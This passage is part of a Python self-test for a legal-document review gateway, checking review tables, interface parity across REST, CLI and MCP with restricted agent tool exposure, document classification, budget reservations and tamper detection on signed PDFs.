    check(_st["findings"] == 6, f"...all six are findings ({_st['findings']})")
    _by = {(c["document_id"], c["column"]): c for c in _st["cells_detail"]}
    check(_by[("a" * 64, "governing law")]["state"] == "FOUND"
          and _by[("a" * 64, "governing law")]["value"] == "India",
          "the answer is right where the document answers it")
    check(_by[("a" * 64, "governing law")]["quote"] in _DOCS["a" * 64],
          "...and its quote byte-matches that document")
    check(_by[("c" * 64, "governing law")]["state"] == "NOT_FOUND",
          f"a document with no such clause is NOT_FOUND, not FAILED "
          f"({_by[('c' * 64, 'governing law')]['state']})")
    check(_by[("b" * 64, "term end")]["state"] == "NOT_FOUND",
          "...and a date column with no date is NOT_FOUND too")

    # .export gives a safe CSV.
    _ex2 = _eV["review_table.export"].run({"grid_id": _gid}, _e2e)
    _rows2 = [r for r in _csv2.reader(_io2.StringIO(_ex2["csv"]))]
    check(len(_rows2) == 4 and _rows2[0] == ["document", "governing law", "term end"],
          f"**.export gives a header and one row per document** ({len(_rows2) - 1} rows)")
    check(not [v for r in _rows2[1:] for v in r if not str(v).strip()],
          "...no cell is empty")
    check(not any(v.startswith(("=", "+", "@")) for r in _rows2 for v in r),
          "...and nothing in it can run as a formula")
    check("NOT FOUND" in _ex2["csv"] and "India" in _ex2["csv"],
          "...with findings and absences both legible")

    # A transport error is the ONLY way to FAILED.
    _ft = Context(tenant="gate-firm", store=_MB(), queue=_Q(), clock=lambda: "2026-10-01T10:00:00+05:30",
                  documents={"a" * 64: {"text": "synthetic"}},  # 028: the caller's own upload
                  model_for=lambda _o: (lambda *_a: (_ for _ in ()).throw(
                      TimeoutError("the provider did not respond"))))
    _ft.documents.update(_e2e.documents)
    _fg = _eV["review_table.create"].run(
        {"name": "t", "document_ids": ["a" * 64],
         "columns": [{"name": "governing law", "kind": "text", "question": "Which law?"}]},
        _ft)["grid_id"]
    _fh = queue_handlers(_ft)
    _run_once(queue=_ft.queue, store=_ft.store, handlers=_fh, worker="w1")
    _fs = _eV["review_table.status"].run({"grid_id": _fg}, _ft)
    check(_fs["by_state"]["FAILED"] == 1 and _fs["findings"] == 0,
          f"an INJECTED transport error is the only route to FAILED, and it is not a "
          f"finding ({_fs['by_state']})")
    check("COULD NOT RUN" in _eV["review_table.export"].run({"grid_id": _fg},
                                                            _ft)["csv"],
          "...and it exports as COULD NOT RUN, never as NOT FOUND")

    # ══ cancel mid-run: nothing left running, no double execution ════════════
    _cc = Context(tenant="gate-firm", store=_MB(), queue=_Q(), clock=lambda: "2026-10-01T10:00:00+05:30",
                  model_for=_answerer)
    _cc.documents.update(_e2e.documents)
    _cg = _eV["review_table.create"].run(
        {"name": "cancel me", "document_ids": list(_DOCS),
         "columns": [{"name": "governing law", "kind": "text", "question":
                      "Which law governs this agreement?"}]}, _cc)["grid_id"]
    _ch = queue_handlers(_cc)
    _run_once(queue=_cc.queue, store=_cc.store, handlers=_ch, worker="w1")   # 1 of 3
    _mid = _eV["review_table.status"].run({"grid_id": _cg}, _cc)
    check(_mid["findings"] == 1 and _mid["by_state"]["PENDING"] == 2,
          f"one cell is answered and two are still PENDING ({_mid['by_state']})")

    _can = _eV["review_table.cancel"].run({"grid_id": _cg}, _cc)
    check(_can["cancelled"] and _can["findings_kept"] == 1
          and _can["pending_stopped"] == 2,
          f"cancel KEEPS the answer and stops the rest ({_can['findings_kept']} kept, "
          f"{_can['pending_stopped']} stopped)")
    _after = _eV["review_table.status"].run({"grid_id": _cg}, _cc)
    check(_after["findings"] == 1,
          "**the answered cell survives the cancel** -- a lawyer who cancels at cell 1 of "
          "3 still wants the 1")
    check(_after["by_state"]["PENDING"] == 2 and _after["by_state"]["FAILED"] == 0,
          f"...and the unrun cells stay PENDING, NOT FAILED: nothing went wrong "
          f"({_after['by_state']})")
    check(_after["cancelled"], "...and the table reports itself cancelled")
    check(not _eV["review_table.create"].run(
              {"name": "x", "document_ids": list(_DOCS),
               "columns": [{"name": "governing law", "kind": "text",
                            "question": "Which law governs this agreement?"}],
               "grid_id": _cg}, _cc).get("scheduled", {}).get("enqueued"),
          "re-creating a cancelled grid schedules NOTHING new: every cell is either "
          "answered or already queued, so the two exactly-once guards hold")

    # No double execution: drain whatever is left and assert the answered cell is
    # unchanged and each cell was written at most once.
    _before_val = _after["cells_detail"]
    for _ in range(10):
        if _run_once(queue=_cc.queue, store=_cc.store, handlers=_ch, worker="w2") is None:
            break
    _end = _eV["review_table.status"].run({"grid_id": _cg}, _cc)
    _first = {(c["document_id"], c["column"]): c["value"]
              for c in _before_val if c["state"] == "FOUND"}
    _last = {(c["document_id"], c["column"]): c["value"]
             for c in _end["cells_detail"] if c["state"] == "FOUND"}
    check(all(_last.get(k) == v for k, v in _first.items()),
          "**no double execution**: a cell answered before the cancel holds exactly the "
          "value it held, after every remaining job has been drained")
    check(_end["cells"] == 3, "...and the grid is still three cells, not six")

    # ── PARITY, the point of the file ───────────────────────────────────────
    check(set(rest) == names and set(cli) == names,
          f"REST and CLI expose every verb (rest {sorted(set(rest) ^ names)}, "
          f"cli {sorted(set(cli) ^ names)})")
    mcp_names = {t.name for t in mcp}
    # Read-only AND opted in. `mcp=False` is the narrower statement the verb table gained
    # in 8b: an operator's number or a client list is read-only and still has no business
    # in an agent's toolbox. Before it, the only ways to keep such a verb off MCP were to
    # call it a write (false) or not to have the verb at all.
    expected_mcp = {mcp_name(v) for v in VERBS if v.read_only and v.mcp}
    check(mcp_names == expected_mcp,
          f"MCP exposes every read-only verb THAT OPTS IN, and no other "
          f"({sorted(mcp_names)})")
    _opted = {v.name for v in VERBS if v.read_only and not v.mcp}
    check(_opted == {"matters.list", "calendar.upcoming", "usage.status", "jobs.dead",
                     "draft.list",
                     "vault.status", "vault.list",
                     "vault.find", "vault.verify", "vault.summarize", "vault.research",
                     "vault.compile",
                     # move 16 (T4). Off MCP: it prices the firm's own SPEND, and the
                     # Themis tool count is fixed at 31.
                     "runs.preview",
                     # move 8 (T3). Off MCP for the same reason as every vault read -- it
                     # verifies the CLIENT'S OWN document -- and additionally because
                     # `scripts/themis_mcp.py` asserts `len(TOOLS) == 31` and is a Themis
                     # file this session must not edit.
                     "document.verify",
                     # 026. Read-only, but there is no agent task that needs "who am I",
                     # and a brand-new identity-reading tool gets no MCP exposure without
                     # a stated reason -- the same default `jobs.dead`/`usage.status` use.
                     "auth.me",
                     # general-research. Off MCP on the SAME mechanical limit as
                     # document.verify -- the Themis tool count is frozen at 31 and
                     # scripts/themis_mcp.py must not be edited here -- NOT because case
                     # law is sensitive: it is public LICENSED open data.
                     "research.cases", "research.web",
                     # 028. Who holds access to which matter names the firm's clients and
                     # its people; administration, not an agent task.
                     "matters.members", "matters.access_report",
                     # 036. The firm's staff list and who is being invited: administration.
                     "people.list", "invites.list",
                     # A table's name can name the client; same reason as matters.list.
                     "review_table.list",
                     # 032. The firm's CIN, office and class: company data, and no agent
                     # task needs it that `ask` does not already attach.
                     "company_profile.get"},
          f"...and the verbs that opt out are the ones that should: client and draft lists, the "
          f"firm's SPEND, and "
          f"every read of the VAULT -- which is the client's documents themselves. "
          f"calendar.upcoming and research.cases are the odd ones, out on a LIMITATION rather than a "
          f"principle, and its handler says so ({sorted(_opted)})")
    check(all(not v.mcp for v in VERBS if v.name.startswith("vault.") and v.read_only),
          "**no vault read is an MCP tool**: there is no agent task that should be able "
          "to search a firm's documents by default")
    _opted_out = {v.name for v in VERBS if v.read_only and not v.mcp}
    check({n.split(".", 1)[1] for n in mcp_names}
          == names - set(write_verbs()) - _opted_out,
          "...and the gap between MCP and the others is EXACTLY the write verbs, which is "
          "checker/mcp/policy.py's rule and not an oversight")

    # Parity against the REAL surface, not only against what this module generates:
    # themis.ask already existed (the /v1 engine ask, wired before the agent runtime) and
    # is not replaced, so the question is whether every read-only verb has SOME tool --
    # not whether this module produced it.
    from checker.mcp.tools import TOOLS as LIVE_TOOLS
    live = {t.name for t in LIVE_TOOLS}
    absent = [mcp_name(v) for v in VERBS
              if v.read_only and v.mcp and mcp_name(v) not in live]
    check(not absent, f"every read-only verb has a tool on the live MCP surface ({absent})")
    check(mcp_name(by_name()["ask"]) in live,
          "...themis.ask among them, served by the tool that already existed rather than "
          "by quietly swapping what a published tool does")
    check(all(mcp_name(by_name()[w]) not in live for w in write_verbs()),
          f"...and no WRITE verb reached it ({write_verbs()})")

    drift = []
    for v in VERBS:
        want = v.signature
        cli_sig = tuple(sorted((f.lstrip("-").replace("-", "_"), req)
                               for f, req in cli[v.name]["flags"].items()))
        rest_sig = tuple(sorted(
            (n, n in rest[v.name]["required"])
            for n in rest[v.name]["body"] + rest[v.name]["path_params"]))
        if cli_sig != want or rest_sig != want:
            drift.append((v.name, want, rest_sig, cli_sig))
    check(not drift, f"every surface takes the SAME inputs with the same required flags "
                     f"({drift[:2]})")

    for t in mcp:
        v = by_name()[t.name.split(".", 1)[1]]
        got = tuple(sorted((n, n in set(t.schema["required"]))
                           for n in t.schema["properties"]))
        check(got == v.signature,
              f"{t.name} takes the same inputs as its verb")

    # ── the mutation: a new verb must show up in all three, or this is theatre ─
    probe = Verb("widgets.count", "how many widgets",
                 (Field("since", STRING, True),), "GET", read_only=True)
    w = Verb("widgets.delete", "remove one", (Field("id", STRING, True),),
             "POST", read_only=False)
    hypo = VERBS + (probe, w)
    check("widgets.count" in rest_spec(hypo) and "widgets.count" in cli_spec(hypo)
          and f"{MCP_NAMESPACE}.widgets.count" in {t.name for t in mcp_tools(hypo)},
          "a verb added to the table appears in ALL THREE surfaces without another edit -- "
          "so drift needs someone to edit this file, which is the point")
    check(f"{MCP_NAMESPACE}.widgets.delete" not in {t.name for t in mcp_tools(hypo)},
          "...while a WRITE verb is kept out of MCP by mcp_tools(), not by the author "
          "remembering to")
    check("widgets.delete" in write_verbs(hypo), "...and is named in write_verbs()")
    check(len(VERBS) == 69 and "widgets.count" not in rest_spec(),
          "...and the probe changed nothing in this module: the surfaces are generated "
          "from an argument, not from a global the test rebound")

    # ── paths ───────────────────────────────────────────────────────────────
    paths = {v: rest[v]["path"] for v in rest}
    check(len(set(paths.values())) == len(paths), f"every REST path is distinct ({paths})")
    check(paths["runs.get"] == "/v2/runs/{run_id}"
          and paths["runs.trace"] == "/v2/runs/{run_id}/trace",
          f"a dotted verb becomes a nested path ({paths['runs.trace']})")
    check(paths["ask"] == "/v2/ask" and paths["review_contract"] == "/v2/review-contract",
          f"an underscore becomes a hyphen in a URL ({paths['review_contract']})")
    for v in VERBS:
        for f in v.path_fields:
            check("{" + f.name + "}" in paths[v.name],
                  f"{v.name}: the path field {f.name} is IN the path, not the body")
    check(all(p.startswith(V2) for p in paths.values()),
          "...and every generated route is under /v2, so /v1 cannot be shadowed")

    try:
        Field("x", STRING, required=False, in_path=True)
        check(False, "an optional path field is refused")
    except ValueError:
        check(True, "an optional path field is refused at construction: a URL either has "
                    "that segment or it is a different route")

    # ── the handlers, offline ───────────────────────────────────────────────
    ctx = Context()
    check(_ask({}, ctx)["code"] == "BAD_REQUEST", "ask without a question is refused")
    check(_review_contract({"text": " "}, ctx)["code"] == "BAD_REQUEST",
          "review_contract without text is refused")
    check(_runs_get({"run_id": "r1"}, Context())["code"] == "NO_STORE",
          "a run lookup with no store says NO_STORE, not NOT_FOUND -- those are different "
          "facts and only one of them is about the run")

    class _S:
        def read(self, rid):
            return {"id": "r1", "status": "ANSWERED", "actor_id": "unknown",
                    "steps": [{"capability": "intake"}]} if rid == "r1" else None
    s = Context(store=_S())
    check(_runs_get({"run_id": "nope"}, s)["code"] == "NOT_FOUND",
          "...and NOT_FOUND when the store is there and the run is not")
    check("steps" not in _runs_get({"run_id": "r1"}, s),
          "runs.get omits the steps -- runs.trace is the verb that serves them")
    check(_runs_trace({"run_id": "r1"}, s)["steps"] == [{"capability": "intake"}],
          "runs.trace serves them, in order, as persisted")

    d = Context()
    up = _documents_upload({"text": "a contract"}, d)
    again = _documents_upload({"text": "a contract"}, d)
    check(up["document_id"] == again["document_id"] and len(d.documents) == 1,
          "a document is identified BY its sha256, so uploading it twice is one document")
    check("survive a restart" in up["note"] or "survives a restart" in up["note"],
          "...and the reply says the store is memory and what that costs")
    check(_documents_upload({"text": ""}, d)["code"] == "BAD_REQUEST",
          "an empty upload is refused rather than stored as a document of nothing")

    # ── review_document: classify first, and a notice is not minutes ────────
    from gateway.store import MemoryBackend as _MB
    from checker.ss import defects as _ss
    _NOTICE = ("NOTICE OF THE 14th ANNUAL GENERAL MEETING\n\nNotice is hereby given that "
               "the meeting will be held on 30 September 2026. An explanatory statement is "
               "annexed and a proxy form is enclosed. E-voting will be available.\n")
    rd_ctx = Context(store=_MB())
    rdoc = _review_document({"text": _ss.CLEAN, "meeting_date": "2026-04-01",
                             "entry_date": "2026-04-20"}, rd_ctx)
    check(rdoc["doc_type"] == "minutes" and rdoc["status"] == "ANSWERED",
          f"review_document classifies the specimen as minutes ({rdoc['doc_type']})")
    check(rdoc.get("run_id"), "...and returns the id of the run it wrote")
    check(all(f["rule_id"] and f["source"] and f["quoted_span"] for f in rdoc["findings"]),
          "...every finding carrying a rule id, a source and a quoted span (PLAN_23 O1)")
    check(any(f["needs_human"] for f in rdoc["findings"]),
          "...and the physical-book items are flagged for a person, not guessed at")
    # The conversation envelope carries the findings, not only the review's note: it once
    # rendered "A lawyer needs to decide this" over five defects and named none of them.
    _rd_env = _envelope_for("REVIEW_DOCUMENT", rdoc, as_of="2026-10-24", ctx=rd_ctx)
    _rd_text = " ".join(b["text"] for b in _rd_env["text_blocks"])
    _rd_flagged = [f for f in rdoc["findings"] if f["status"] in ("DEFECT", "NEEDS_BOOK")]
    check(_rd_flagged and all(f["defect"] in _rd_text and f["rule_id"] in _rd_text
                              for f in _rd_flagged),
          f"every DEFECT / NEEDS_BOOK finding reaches the conversation envelope with its "
          f"rule id ({len(_rd_flagged)} flagged)")
    check(f"{len(_rd_flagged)} finding(s) above" in _rd_text,
          "...and a count line says how many were listed and how many passed")
    check(not _finding_blocks("RESEARCH_QUESTION", {"findings": [{"status": "DEFECT"}]}),
          "...and no other task grows finding blocks from an unrelated `findings` key")

    notice = _review_document({"text": _NOTICE}, Context(store=_MB()))
    minutes_only = {c for c, a in _ss.APPLICABILITY.items() if a == frozenset({"minutes"})}
    fired = [f["rule_id"] for f in notice["findings"]
             if f["rule_id"] in minutes_only and f["status"] == "DEFECT"]
    check(notice["doc_type"] == "notice" and not fired,
          f"NO minutes check reports a defect on a notice {fired} -- the failure mode that "
          f"produced 80-93% false positives against compliant filings")

    unknown = _review_document({"text": "Dear Sir, please find the cheque enclosed. "
                                        "Kindly acknowledge receipt."}, Context(store=_MB()))
    check(unknown["status"] == "UNCLASSIFIED" and unknown["code"] == "CLASSIFICATION_UNCERTAIN",
          f"an unidentifiable document is classification UNCERTAINTY ({unknown['status']})")
    check(unknown["findings"] == [] and unknown["requires_review"],
          "...with no findings at all, and still requiring review: 0 defects about a "
          "document nobody identified must not read as a clean bill")
    check(_review_document({"text": " "}, Context())["code"] == "BAD_REQUEST",
          "review_document without text is refused")
    check(_review_document({"text": _ss.CLEAN, "meeting_date": "1 April 2026"},
                           Context())["code"] == "BAD_REQUEST",
          "...and an unreadable date is refused rather than silently treated as absent")

    # ── move 16 (T4): runs.preview, and the money balancing to zero ─────────
    # The done-when: "Preview -> start -> result, with the reservation balancing to zero."
    # Measured against a REAL ledger on a temp file, and the balance is read out of the
    # ledger at each stage rather than inferred from what the verbs reported.
    import tempfile as _t5tmp
    from datetime import date as _t5date
    from agents import multi_plan as _t5mp
    from agents import multi_runner as _t5mr
    from backend.budget import BudgetTracker as _T5BT, FileStore as _T5FS

    with _t5tmp.TemporaryDirectory() as _t5dir:
        import pathlib as _t5pl
        _t5ledger = _T5BT(_T5FS(_t5pl.Path(_t5dir) / "budget.json"),
                          today=_t5date(2026, 10, 5))

        def _t5_held() -> dict:
            return {k: v for k, v in (_t5ledger._state().get("reservations") or {}).items()
                    if k.startswith("ma1-")}

        _t5_real = model_access._ledger
        model_access._ledger = lambda: _t5ledger
        try:
            _t5_workers = [{"agent": "research_question", "task": f"sub-question {i}"}
                           for i in range(3)]
            # 1. PREVIEW
            _pv = _runs_preview({"goal": "answer in three parts",
                                 "workers": _t5_workers}, Context(tenant="gate-firm"))
            check(_pv["would_run"] is True,
                  f"a preview of a sound plan says it would run ({_pv['would_run']})")
            check(_pv["agents"] == ["research_question"]
                  and _pv["plan"]["worker_count"] == 3,
                  f"...naming the agents and the worker count, which is what a lawyer is "
                  f"being asked to approve ({_pv['agents']}, "
                  f"{_pv['plan']['worker_count']})")
            check(isinstance(_pv["quoted_inr"], float) and _pv["quoted_inr"] > 0,
                  f"...with a real price, produced by actually reserving rather than by "
                  f"multiplying a figure somebody wrote down (₹{_pv['quoted_inr']})")
            check(_pv["held_inr"] == 0.0 and not _t5_held(),
                  f"...and HOLDING NOTHING afterwards. A preview that held would leak the "
                  f"cap every time somebody looked at a plan and thought better of it -- "
                  f"which is A-016, measured at 58 reservations worth ₹115.99 against a "
                  f"₹116.67 cap ({_t5_held()})")
            check(_t5ledger._state()["calls_today"] == 0,
                  "a quote releases request-count quota too; previews do not call a provider")
            check("A QUOTE, not a hold" in _pv["note"],
                  "...and the note says so in those words, so a reader is not told the "
                  "money is set aside")
            check(_pv["max_workers"] == _t5mp.MAX_WORKERS
                  and _pv["registered_agents"] == list(_t5mp.WORKER_AGENTS),
                  "...and it discloses the cap and the registry, so a refused plan can be "
                  "narrowed without guessing what is allowed")

            # 2. START, with the runner reserving for itself
            _plan = _t5mp.MultiPlan("answer in three parts",
                                    tuple(_t5mp.Task(w["agent"], w["task"])
                                          for w in _t5_workers))
            _v = _t5mp.validate(_plan, budget=_t5ledger)
            check(_v.ok and len(_t5_held()) == 3,
                  f"the START reserves for itself -- three reservations now outstanding, "
                  f"because the preview released its own ({len(_t5_held())})")
            check(abs(_v.reserved_inr - _pv["quoted_inr"]) < 1e-9,
                  f"...for the SAME amount the preview quoted, because both go through "
                  f"`budget.reserve` rather than through two pieces of arithmetic "
                  f"(₹{_v.reserved_inr} vs ₹{_pv['quoted_inr']})")

            # 3. RESULT
            _out = _t5mr.run(_plan, call=lambda t: f"answer to {t.task}",
                             verify=lambda text, t: text,
                             merge=lambda rs: " | ".join(r.text for r in rs),
                             budget=_t5ledger, reservations=_v.reservations)
            check(_out.status == _t5mr.ANSWERED and _out.complete,
                  f"the run completes ({_out.status})")
            check(not _t5_held(),
                  f"...and the reservations BALANCE TO ZERO: nothing is outstanding after "
                  f"preview -> start -> result ({_t5_held()})")
        finally:
            model_access._ledger = _t5_real
        check(model_access._ledger is _t5_real,
              "the ledger is restored -- a self-test that leaves `_ledger` patched starves "
              "every check after it, which this file has been bitten by twice")

    # ── a preview REFUSES as a product state, not as an error ───────────────
    _pv_bad = _runs_preview({"goal": "too many", "workers":
                             [{"agent": "research_question", "task": f"q{i}"}
                              for i in range(_t5mp.MAX_WORKERS + 1)]}, Context(tenant="gate-firm"))
    check(_pv_bad["would_run"] is False
          and _pv_bad["refusal_code"] == _t5mp.TOO_MANY_WORKERS,
          f"a plan over the cap previews as `would_run: false` with the code, NOT as a 4xx "
          f"-- 'this would not run, and here is why' is the whole purpose of a preview "
          f"({_pv_bad['refusal_code']})")
    check(_pv_bad["quoted_inr"] is None,
          f"...and quotes NO price, because a price for work that will not happen is a "
          f"number with no referent ({_pv_bad['quoted_inr']})")
    check(_runs_preview({"goal": "x", "workers": [{"agent": "nope", "task": "t"}]},
                        Context(tenant="gate-firm"))["refusal_code"] == _t5mp.UNKNOWN_AGENT,
          "an unregistered agent previews as UNKNOWN_AGENT")
    check(_runs_preview({"goal": "x", "workers": "not a list"},
                        Context(tenant="gate-firm")).get("code") == "BAD_REQUEST",
          "a malformed `workers` is a BAD_REQUEST refusal, since there is no plan to preview")
    # ── move 8 (T3): document.verify, one line per check ────────────────────
    # The done-when: "a re-saved signed PDF reports MODIFIED. The overall result is COMPLETE
    # only when every needed check is established." Driven over the VERB, against REAL signed
    # PDFs from corpus/testdocs/_raw -- the engine's own suites already cover the parsers, and
    # what was missing was any path from a stored document to them.
    import tempfile as _t3tmp
    from pathlib import Path as _T3Path
    from gateway.filestore import LocalFileStore as _T3LFS
    # Aliased: `MemoryBackend` is imported plain further down `_test()`, which makes it a
    # FUNCTION-LOCAL name unbound at this point. Python scoping, not a missing import.
    from gateway.store import MemoryBackend as _T3MB
    from checker import doc_verification as _t3dv
    from checker.pdf_signature import VALID as _T3SIG_VALID, verify as _t3sigverify

    _t3_signed = [q for q in sorted(_T3Path("corpus/testdocs/_raw").glob("*.pdf"))
                  if _t3sigverify(q).verdict == _T3SIG_VALID]
    check(len(_t3_signed) >= 1,
          f"the corpus holds a validly signed PDF to drive this over ({len(_t3_signed)})")

    with _t3tmp.TemporaryDirectory() as _t3dir:
        _t3_files = _T3LFS(_t3dir)
        _t3_store = _T3MB()
        _t3_ctx = Context(store=_t3_store, files=_t3_files,
                          clock=lambda: "2026-10-05T00:00:00Z")

        def _t3_put(name: str, data: bytes) -> str:
            sha = _t3_files.put(data)
            did = f"doc-{sha[:12]}"
            _t3_store.write_vault_document(
                {"document_id": did, "matter_id": None, "uploaded_by": "unknown", "sha256": sha, "name": name,
                 "byte_count": len(data), "state": "INGESTED"})
            return did

        _t3_good_bytes = _t3_signed[0].read_bytes()
        _t3_good = _t3_put(_t3_signed[0].name, _t3_good_bytes)
        _t3_ok = _document_verify({"document_id": _t3_good}, _t3_ctx)
        _by = {c["field"]: c for c in _t3_ok["checks"]}
        check(len(_t3_ok["checks"]) == len(VERIFY_CHECK_NAMES)
              and set(_by) == set(VERIFY_CHECK_NAMES),
              f"every check is its own line, named for a reader rather than as a field id "
              f"({len(_t3_ok['checks'])} lines)")
        check(_by["signature"]["result"] == _t3dv.VALID
              and _by["file_integrity"]["result"] == _t3dv.VALID,
              f"a real signed document's signature validates and its signed bytes are "
              f"unchanged ({_by['signature']['result']}, "
              f"{_by['file_integrity']['result']})")

        # The official-record checks: NOT_CHECKED, with the reason, for both.
        for _f in VERIFY_NEEDS_PERMISSION:
            check(_by[_f]["result"] == _t3dv.NOT_CHECKED
                  and "permission this deployment does not hold" in _by[_f]["detail"],
                  f"{_f} is NOT_CHECKED and says a permission is missing -- 'we did not "
                  f"look' and 'we looked and it did not match' are different findings, and "
                  f"only the first is true ({_by[_f]['result']})")
        check(_t3_ok["overall"] != _t3dv.COMPLETE and _t3_ok["complete"] is False,
              f"...so a GENUINE document is not COMPLETE today, because two required checks "
              f"were never run. COMPLETE would claim we established something we did not "
              f"({_t3_ok['overall']})")
        check("not established" in _t3_ok["sentence"],
              f"...and the sentence says which ({_t3_ok['sentence'][:70]}…)")

        # ── a RE-SAVED document reports MODIFIED ────────────────────────────
        # One byte flipped inside the signed range is what "re-saved" does to a signature:
        # the digest no longer matches the bytes. `checker/pdf_signature` proves the parser
        # catches it; this proves the VERB does, which is the part a reader ever sees.
        _t3_bad = bytearray(_t3_good_bytes)
        _t3_i = next(j for j in range(200, len(_t3_bad)) if _t3_bad[j:j + 1].isalpha())
        _t3_bad[_t3_i] ^= 0x20
        _t3_mod = _t3_put("resaved-" + _t3_signed[0].name, bytes(_t3_bad))
        _t3_out = _document_verify({"document_id": _t3_mod}, _t3_ctx)
        _bym = {c["field"]: c for c in _t3_out["checks"]}
        check(_t3_out["overall"] == _t3dv.FAILED,
              f"a re-saved signed PDF is VERIFICATION_FAILED, not merely incomplete "
              f"({_t3_out['overall']})")
        check(_bym["file_integrity"]["result"] == _t3dv.INVALID
              or _bym["signature"]["result"] == _t3dv.INVALID,
              f"...because a named check is INVALID, so the finding points at WHICH fact "
              f"failed ({_bym['file_integrity']['result']}, "
              f"{_bym['signature']['result']})")
        check("must not be relied on" in _t3_out["sentence"],
              f"...and the reader is told not to rely on it ({_t3_out['sentence'][:60]}…)")
        check(_t3_out["complete"] is False, "a failed verification is never complete")

        # An unsigned document is not a tampered one, and must not read as one.
        _t3_unsigned = [q for q in sorted(_T3Path("corpus/testdocs/_raw").glob("*.pdf"))
                        if _t3sigverify(q).verdict != _T3SIG_VALID]
        if _t3_unsigned:
            _t3_un = _t3_put(_t3_unsigned[0].name, _t3_unsigned[0].read_bytes())
            _t3_uo = _document_verify({"document_id": _t3_un}, _t3_ctx)
            check(_t3_uo.get("overall") != _t3dv.FAILED or _t3_uo.get("code"),
                  f"an UNSIGNED document does not report as tampered: no signature is not a "
                  f"broken signature ({_t3_uo.get('overall') or _t3_uo.get('code')})")

        # A deleted document, and a record whose bytes are gone: both named, neither a pass.
        _t3_store.write_vault_document(
            {"document_id": "doc-gone", "matter_id": None, "uploaded_by": "unknown", "sha256": "e" * 64,
             "name": "gone.pdf", "byte_count": 1, "state": "INGESTED"})
        _t3_g = _document_verify({"document_id": "doc-gone"}, _t3_ctx)
        check(_t3_g.get("code") == "NOT_FOUND"
              and "says nothing about the document" in (_t3_g.get("detail") or ""),
              f"a record whose bytes the store does not hold is OUR failure, said so, and "
              f"not a finding about the document ({_t3_g.get('code')}: "
              f"{str(_t3_g.get('detail'))[:60]}…)")

    # No file store at all: refused NO_VAULT, exactly as the vault verbs are.
    check(_document_verify({"document_id": "x"},
                           Context(store=_T3MB())).get("code") == "NO_VAULT",
          "with no file store the verb refuses NO_VAULT rather than reporting an unverified "
          "document as unverifiable for a reason of its own")
    check(all(f in VERIFY_CHECK_NAMES
              for f in _t3dv.Verification.__dataclass_fields__ if f != "detail"),
          "every field of `Verification` has a reader-facing sentence here, so a check added "
          "to that dataclass cannot appear in a response as a bare identifier")

    # ── move 10 (T3): document.check, action recorded ───────────────────────
    # Driven over the VERB, against the same real signed PDFs move 8 used, and against a
    # store whose rules are 023's. The done-whens: an expired document is never KEEP, and any
    # NOT_CHECKED check blocks KEEP.
    from checker import doc_validity as _t4dval

    with _t3tmp.TemporaryDirectory() as _t4dir:
        _t4_files = _T3LFS(_t4dir)
        _t4_store = _T3MB()
        _t4_ctx = Context(store=_t4_store, files=_t4_files,
                          clock=lambda: "2026-10-05T00:00:00Z")
        _t4_sha = _t4_files.put(_t3_signed[0].read_bytes())
        _t4_did = "11111111-1111-4111-8111-111111111111"
        _t4_store.write_vault_document(
            {"document_id": _t4_did, "matter_id": None, "uploaded_by": "unknown", "sha256": _t4_sha,
             "name": "cert.pdf", "byte_count": 10, "state": "INGESTED"})
        # The document's own text, through the vault chunks the verb reads -- so the date
        # comes from the document rather than from an argument.
        # STRINGS, not dicts: `write_vault_chunks` takes the text. My first version passed
        # `{"ordinal": 0, "text": ...}` and the store stringified the dict, so the document's
        # date line never existed and the validity came back "no date" rather than "no rule"
        # -- a fixture bug that looked like a product one.
        _t4_store.write_vault_chunks(_t4_did, ["CERTIFICATE", "Date: 14 March 2024"])

        _t4 = _document_check({"document_id": _t4_did, "as_of": "2026-10-05"}, _t4_ctx)
        check(_t4["action"]["action"] != _t4dval.KEEP,
              f"a document with unrun checks is never KEEP ({_t4['action']['action']})")
        check(_t4["action"]["action"] == _t4dval.NEEDS_LAWYER,
              f"...it is NEEDS_LAWYER ({_t4['action']['action']})")
        # And the reason is the VALIDITY one, not the unrun-check one -- which is worth
        # asserting because it records a real limitation rather than hiding it. This verb
        # passes NO validity `rule`, because no registry says which document class expires
        # under which provision, and a caller-supplied quote would be a provision nobody
        # checked against the corpus. So every document is NOT_DETERMINED and `act()`'s
        # KEEP, RENEW_BY and REPLACE branches are UNREACHABLE FROM THIS VERB today. They are
        # reached and proved in `checker/doc_validity`'s own suite, over a Rule object.
        # Recorded as A-021 in research/TASKS.md.
        check(_t4["validity"]["status"] == _t4dval.NOT_DETERMINED
              and "no rule was given" in _t4["action"]["reason"],
              f"...and the reason is that no validity RULE exists for this document class, "
              f"said plainly rather than implied -- an unknown validity period is not an "
              f"unlimited one ({_t4['action']['reason'][:80]}…)")
        check("NOT_DETERMINED" in _t4["note"] or "not run" in _t4["note"],
              "...and the verb's own note tells a reader this is the expected answer today")
        check(_t4["recorded"] and _t4["check_id"],
              f"...and the check is RECORDED, which is what makes it answerable months "
              f"later ({_t4['check_id']})")
        check(len(_t4_store.read_document_checks(document_id=_t4_did)) == 1,
              "...as one row in document_checks")
        check(set(_t4) >= {"verification", "validity", "action"},
              f"the three questions are answered SEPARATELY -- signed, in force, and what to "
              f"do -- rather than collapsed into one verdict ({sorted(_t4)})")

        # A second check on the same document APPENDS. 023's whole shape.
        _t4b = _document_check({"document_id": _t4_did, "as_of": "2024-04-01"}, _t4_ctx)
        check(len(_t4_store.read_document_checks(document_id=_t4_did)) == 2,
              f"a second check adds a row rather than replacing one "
              f"({len(_t4_store.read_document_checks(document_id=_t4_did))})")
        check(_t4b["as_of"] == "2024-04-01",
              f"...and `as_of` is the date asked ABOUT, not the wall clock: a correct answer "
              f"about a past date is not a stale answer about today ({_t4b['as_of']})")

        # A re-saved document: NEEDS_LAWYER, and it outranks every validity question.
        _t4_bad = bytearray(_t3_signed[0].read_bytes())
        _t4_i = next(j for j in range(200, len(_t4_bad)) if _t4_bad[j:j + 1].isalpha())
        _t4_bad[_t4_i] ^= 0x20
        _t4_bsha = _t4_files.put(bytes(_t4_bad))
        _t4_bdid = "22222222-2222-4222-8222-222222222222"
        _t4_store.write_vault_document(
            {"document_id": _t4_bdid, "matter_id": None, "uploaded_by": "unknown", "sha256": _t4_bsha,
             "name": "resaved.pdf", "byte_count": 10, "state": "INGESTED"})
        _t4m = _document_check({"document_id": _t4_bdid, "as_of": "2026-10-05"}, _t4_ctx)
        check(_t4m["verification"]["overall"] == "VERIFICATION_FAILED"
              and _t4m["action"]["action"] == _t4dval.NEEDS_LAWYER,
              f"a re-saved document is NEEDS_LAWYER -- a tampered document is a legal "
              f"problem, not a filing one ({_t4m['action']['action']})")
